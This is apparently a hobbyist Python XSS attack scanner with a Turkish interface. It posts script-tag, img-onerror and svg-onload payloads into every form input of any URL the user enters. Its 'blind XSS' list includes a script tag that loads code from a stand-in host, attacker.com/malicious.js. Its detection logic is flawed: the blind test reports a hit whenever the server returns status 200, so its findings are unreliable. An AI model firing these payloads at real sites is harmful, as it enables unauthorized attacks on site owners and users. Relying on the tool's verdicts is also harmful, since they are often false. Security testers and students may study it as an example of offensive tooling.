import os
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore

def clear_console():
    os.system("clear" if os.name == "posix" else "cls")

def xss_scan(url):
    clear_console()
    print(Fore.RED + """
 █████ █████  █████   █████
░░███ ░░███  ███░░   ███░░
 ░░░█████░  ░░█████ ░░█████
  ███░░░███  ░░░░███ ░░░░██  attack 1.1v
 █████ █████ ██████  ██████
░░░░░ ░░░░░ ░░░░░░  ░░░░░░

producer  〔coded by enesxsec〕
instagram 〔xsecit〕
github    〔https://github.com/ghost0x02〕

""")

    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(Fore.YELLOW + f"{url} adresi başarıyla tarandı!")
            print(Fore.GREEN + "")
            time.sleep(2)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                print(f"Form bulundu: {form}")
                stored_xss_test(soup, url)
                reflected_xss_test(form, url)
                dom_based_xss_test(form, url)
                blind_xss_test(form, url)

            generic_xss_test(url)

        else:
            print(f"URL'ye bağlanırken bir hata oluştu. Durum kodu: {response.status_code}")

    except Exception as e:
        print(f"XSS taraması sırasında bir hata oluştu: {e}")

def stored_xss_test(soup, url):
    stored_xss_payloads = [
        '<script>alert("Stored XSS Attack")</script>',
        '<img src="x" onerror="alert(\'Stored XSS Attack\')" />',
    ]

    for payload in stored_xss_payloads:
        if payload in soup.text:
            print(f"Stored XSS zafiyeti bulundu: {url} - Payload: {payload}")

def reflected_xss_test(form, url):
    reflected_xss_payloads = [
        '<script>alert("Reflected XSS Attack")</script>',
        '<img src="x" onerror="alert(\'Reflected XSS Attack\')" />',
    ]

    for payload in reflected_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            form_data = {input_field['name']: input_field['value'] for input_field in form.find_all('input')}
            try:
                response = requests.post(url, data=form_data)
                if payload in response.text:
                    print(f"Reflected XSS zafiyeti bulundu: {url} - Payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Post isteği sırasında hata oluştu: {e}")

def dom_based_xss_test(form, url):
    dom_based_xss_payloads = [
        '<script>document.write("DOM-based XSS Attack")</script>',
        '<img src="x" onerror="alert(\'DOM-based XSS Attack\')" />',
    ]

    for payload in dom_based_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            form_data = {input_field['name']: input_field['value'] for input_field in form.find_all('input')}
            try:
                response = requests.post(url, data=form_data)
                if payload in response.text:
                    print(f"DOM-based XSS zafiyeti bulundu: {url} - Payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Post isteği sırasında hata oluştu: {e}")

def blind_xss_test(form, url):
    blind_xss_payloads = [
        '<img src="x" onerror="alert(\'Blind XSS Attack\')" />',
        '<script src="https://attacker.com/malicious.js"></script>',
    ]

    for payload in blind_xss_payloads:
        for input_field in form.find_all('input'):
            input_field['value'] = payload
            form_data = {input_field['name']: input_field['value'] for input_field in form.find_all('input')}
            try:
                response = requests.post(url, data=form_data)
                if response.status_code == 200:
                    print(f"Blind XSS zafiyeti bulundu: {url} - Payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"Post isteği sırasında hata oluştu: {e}")

def generic_xss_test(url):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
    ]

    for payload in xss_payloads:
        test_url = urljoin(url, payload)
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"Generic XSS zafiyeti bulundu: {test_url} - Payload: {payload}")
            else:
                print(f"Zafiyet bulunamadı: {test_url} - Payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"GET isteği sırasında hata oluştu: {e}")

if __name__ == "__main__":
    os.system("clear")
    print(Fore.MAGENTA + "")
    os.system("figlet xss")
    target_url = input("Hedef URL'yi girin: ")
    xss_scan(target_url)
